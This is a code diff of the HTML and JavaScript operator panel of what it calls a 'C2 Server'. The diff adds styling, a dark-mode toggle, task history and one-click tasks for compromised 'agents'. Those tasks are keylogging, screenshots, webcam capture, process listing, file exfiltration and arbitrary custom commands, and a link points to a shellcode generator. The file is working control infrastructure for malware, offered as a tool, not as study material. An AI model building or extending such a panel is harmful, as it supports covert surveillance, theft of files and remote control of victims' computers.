@@ -2,26 +2,388 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Agent Task Control Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Task Control Panel - C2 Server</title>
+    <style>
+        :root {
+            --bg: #f4f4f4;
+            --text: #333;
+            --card: #fff;
+            --border: #ddd;
+            --primary: #007BFF;
+            --success: #28a745;
+            --danger: #dc3545;
+            --warning: #ffc107;
+            --info: #17a2b8;
+        }
+
+        [data-theme="dark"] {
+            --bg: #121212;
+            --text: #f4f4f4;
+            --card: #1e1e1e;
+            --border: #333;
+            --primary: #0d6efd;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            margin: 0;
+            padding: 20px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        h1, h2 {
+            color: var(--text);
+        }
+
+        nav {
+            margin-bottom: 20px;
+        }
+
+        nav a {
+            margin-right: 15px;
+            text-decoration: none;
+            color: var(--primary);
+            font-weight: 500;
+        }
+
+        .card {
+            background-color: var(--card);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: 500;
+        }
+
+        input[type="text"],
+        select,
+        textarea {
+            width: 100%;
+            padding: 8px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            background-color: var(--card);
+            color: var(--text);
+            margin-top: 5px;
+        }
+
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            opacity: 0.9;
+        }
+
+        button:disabled {
+            background-color: var(--border);
+            cursor: not-allowed;
+        }
+
+        .task-history {
+            margin-top: 20px;
+        }
+
+        .task-item {
+            padding: 15px;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            margin-bottom: 10px;
+            background-color: var(--card);
+        }
+
+        .task-item .status {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+
+        .status.pending {
+            background-color: var(--warning);
+            color: #000;
+        }
+
+        .status.completed {
+            background-color: var(--success);
+            color: #fff;
+        }
+
+        .status.failed {
+            background-color: var(--danger);
+            color: #fff;
+        }
+
+        .task-result {
+            background-color: var(--card);
+            padding: 10px;
+            margin-top: 10px;
+            border-left: 5px solid var(--primary);
+            white-space: pre-wrap;
+        }
+
+        .toggle-theme {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 8px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .predefined-tasks {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .task-button {
+            background-color: var(--card);
+            border: 1px solid var(--border);
+            color: var(--text);
+            padding: 10px;
+            border-radius: 4px;
+            cursor: pointer;
+            text-align: left;
+        }
+
+        .task-button:hover {
+            border-color: var(--primary);
+        }
+
+        .task-button.selected {
+            border-color: var(--primary);
+            background-color: rgba(0, 123, 255, 0.1);
+        }
+    </style>
 </head>
 <body>
-    <h1>Task Control Panel</h1>
-    <nav>
-        <a href="/">Dashboard</a>
-        <a href="/shellcode">Shellcode Generator</a>
-    </nav>
-    <h2>Send Task to Agent</h2>
-    <form method="POST" action="/send_task">
-        <label for="agent_id">Agent ID:</label><br>
-        <input type="text" id="agent_id" name="agent_id" required><br><br>
+    <button class="toggle-theme" onclick="toggleTheme()">🌙 Toggle Dark Mode</button>
+    
+    <div class="container">
+        <h1>Task Control Panel</h1>
+        <nav>
+            <a href="/">Dashboard</a>
+            <a href="/shellcode">Shellcode Generator</a>
+            <a href="/control">Task Control Panel</a>
+        </nav>
 
-        <label for="task">Task (e.g., keylogger, webcam):</label><br>
-        <input type="text" id="task" name="task" required><br><br>
+        <div class="card">
+            <h2>Send Task to Agent</h2>
+            
+            <div class="predefined-tasks">
+                <button class="task-button" onclick="selectTask('keylogger')">
+                    ⌨️ Keylogger
+                    <small style="display: block">Start keylogging session</small>
+                </button>
+                <button class="task-button" onclick="selectTask('screenshot')">
+                    📸 Screenshot
+                    <small style="display: block">Capture screen</small>
+                </button>
+                <button class="task-button" onclick="selectTask('webcam')">
+                    📹 Webcam
+                    <small style="display: block">Capture webcam image</small>
+                </button>
+                <button class="task-button" onclick="selectTask('process_list')">
+                    📊 Process List
+                    <small style="display: block">List running processes</small>
+                </button>
+                <button class="task-button" onclick="selectTask('file_exfil')">
+                    📂 File Exfiltration
+                    <small style="display: block">Retrieve specific files</small>
+                </button>
+                <button class="task-button" onclick="selectTask('custom')">
+                    🔧 Custom Command
+                    <small style="display: block">Execute custom command</small>
+                </button>
+            </div>
 
-        <button type="submit">Send Task</button>
-    </form>
+            <form id="taskForm" onsubmit="return sendTask(event)">
+                <div class="form-group">
+                    <label for="agent_id">Agent ID:</label>
+                    <input type="text" id="agent_id" name="agent_id" required>
+                </div>
 
-    <h3>Agent List</h3>
-    <iframe src="/api/agents" width="100%" height="200px"></iframe>
+                <div class="form-group">
+                    <label for="task_type">Task Type:</label>
+                    <input type="text" id="task_type" name="task_type" required>
+                </div>
+
+                <div class="form-group" id="customParamsGroup" style="display: none;">
+                    <label for="task_params">Task Parameters (JSON):</label>
+                    <textarea id="task_params" name="task_params" placeholder="{ &quot;param1&quot;: &quot;value1&quot; }"></textarea>
+                </div>
+
+                <button type="submit" id="submitBtn">Send Task</button>
+            </form>
+        </div>
+
+        <div class="card task-history">
+            <h2>Task History</h2>
+            <div id="taskHistory">Loading task history...</div>
+        </div>
+    </div>
+
+    <script>
+        // Theme management
+        function toggleTheme() {
+            const current = localStorage.getItem('theme') || 'light';
+            const next = current === 'light' ? 'dark' : 'light';
+            localStorage.setItem('theme', next);
+            document.body.setAttribute('data-theme', next);
+        }
+
+        // Initialize theme
+        document.body.setAttribute('data-theme', localStorage.getItem('theme') || 'light');
+
+        // Task selection
+        function selectTask(taskType) {
+            // Remove selection from all buttons
+            document.querySelectorAll('.task-button').forEach(btn => btn.classList.remove('selected'));
+            
+            // Add selection to clicked button
+            event.target.closest('.task-button').classList.add('selected');
+            
+            const taskInput = document.getElementById('task_type');
+            const paramsGroup = document.getElementById('customParamsGroup');
+            
+            taskInput.value = taskType;
+            
+            // Show/hide params based on task type
+            if (taskType === 'custom' || taskType === 'file_exfil') {
+                paramsGroup.style.display = 'block';
+                if (taskType === 'file_exfil') {
+                    document.getElementById('task_params').placeholder = '{ "path": "/path/to/file" }';
+                } else {
+                    document.getElementById('task_params').placeholder = '{ "command": "your_command_here" }';
+                }
+            } else {
+                paramsGroup.style.display = 'none';
+            }
+        }
+
+        // Send task
+        async function sendTask(event) {
+            event.preventDefault();
+            const submitBtn = document.getElementById('submitBtn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Sending...';
+
+            try {
+                const formData = {
+                    agent_id: document.getElementById('agent_id').value,
+                    task_type: document.getElementById('task_type').value,
+                };
+
+                // Add parameters if present
+                const params = document.getElementById('task_params').value;
+                if (params) {
+                    try {
+                        formData.parameters = JSON.parse(params);
+                    } catch (e) {
+                        alert('Invalid JSON in parameters field');
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Send Task';
+                        return;
+                    }
+                }
+
+                const response = await fetch('/api/tasks', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData),
+                });
+
+                const result = await response.json();
+
+                if (response.ok) {
+                    alert('Task sent successfully!');
+                    document.getElementById('taskForm').reset();
+                    fetchTaskHistory();
+                } else {
+                    throw new Error(result.error || 'Failed to send task');
+                }
+            } catch (error) {
+                alert('Error: ' + error.message);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Send Task';
+            }
+        }
+
+        // Fetch task history
+        async function fetchTaskHistory() {
+            try {
+                const response = await fetch('/api/tasks/history');
+                const tasks = await response.json();
+                
+                const container = document.getElementById('taskHistory');
+                if (tasks.length === 0) {
+                    container.innerHTML = '<p>No tasks in history.</p>';
+                    return;
+                }
+
+                container.innerHTML = tasks.map(task => `
+                    <div class="task-item">
+                        <strong>Agent ID:</strong> ${task.agent_id}
+                        <span class="status ${task.status.toLowerCase()}">${task.status}</span><br>
+                        <strong>Task Type:</strong> ${task.task_type}<br>
+                        <strong>Timestamp:</strong> ${new Date(task.timestamp).toLocaleString()}<br>
+                        ${task.result ? `
+                            <div class="task-result">
+                                <strong>Result:</strong><br>
+                                <pre>${typeof task.result === 'string' ? task.result : JSON.stringify(task.result, null, 2)}</pre>
+                            </div>
+                        ` : ''}
+                    </div>
+                `).join('');
+            } catch (error) {
+                document.getElementById('taskHistory').innerHTML = '<p style="color: var(--danger)">Failed to load task history.</p>';
+                console.error(error);
+            }
+        }
+
+        // Initial load
+        fetchTaskHistory();
+        
+        // Refresh task history periodically
+        setInterval(fetchTaskHistory, 10000);
+    </script>
 </body>
 </html>
